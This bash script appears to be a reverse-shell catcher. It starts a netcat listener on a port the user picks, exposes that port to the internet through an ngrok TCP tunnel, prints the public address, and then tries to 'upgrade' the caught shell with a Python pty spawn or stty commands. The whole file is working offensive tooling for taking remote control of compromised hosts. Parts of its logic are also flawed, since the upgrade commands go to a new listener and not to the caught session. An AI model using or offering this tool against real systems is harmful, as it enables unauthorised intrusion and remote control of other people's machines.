#!/bin/bash

# Function to kill ngrok process and netcat listener
function kill_ngrok {
    pkill -P $$ # Kill all child processes
    exit 0
}

# Get user input for port number
echo -e "\e[1mEnter port number:\e[0m"
read port

# Start netcat listener on specified port
echo -e "\e[1mStarting netcat listener on port \e[32m$port\e[0m"
xterm -e "nc -lvp $port" &

# Create ngrok TCP server on the same port
echo -e "\e[1mStarting ngrok TCP server on port \e[32m$port\e[0m"
ngrok tcp $port --log=stdout >/dev/null & disown

# Set trap to kill ngrok and netcat processes when script receives SIGINT signal
trap kill_ngrok SIGINT

# Wait for ngrok to start and get the TCP IP port
while true; do
    ngrok_url=$(curl -s localhost:4040/api/tunnels | jq -r '.tunnels[0].public_url')
    if [[ $ngrok_url == *"tcp://"* ]]; then
        tcp_port=${ngrok_url#*tcp://}
        ngrok_domain=${ngrok_url#*//}
        ngrok_domain=${ngrok_domain%%:*}
        ngrok_ip=$(dig +short $ngrok_domain)
        echo -e "\e[1mAccess the listener from the WAN using TCP IP address: \e[32m$ngrok_ip\e[0m, address+port: \e[32m$tcp_port\e[0m"
        break
    fi
    sleep 1
done

# Wait for netcat connection to be established and then kill ngrok and netcat processes
while true; do
    if netstat -ant | grep -q $port && ! pgrep -x nc > /dev/null; then
        pkill ngrok
        
        # Try to upgrade the shell
        if type python > /dev/null 2>&1; then
            echo -e "\e[1mUpgrading the shell using Python...\e[0m"
            echo "python -c 'import pty; pty.spawn(\"/bin/bash\")'" | nc -lvp $port &
        else
            echo -e "\e[1mUpgrading the shell using stty...\e[0m"
            echo "stty raw -echo; reset; export SHELL=bash; export TERM=xterm-256color; stty rows $(tput lines) columns $(tput cols)" | nc -lvp $port &
        fi
        
        # Kill the listener process
        pkill -P $$ 
        exit 0
    fi
    sleep 1
done
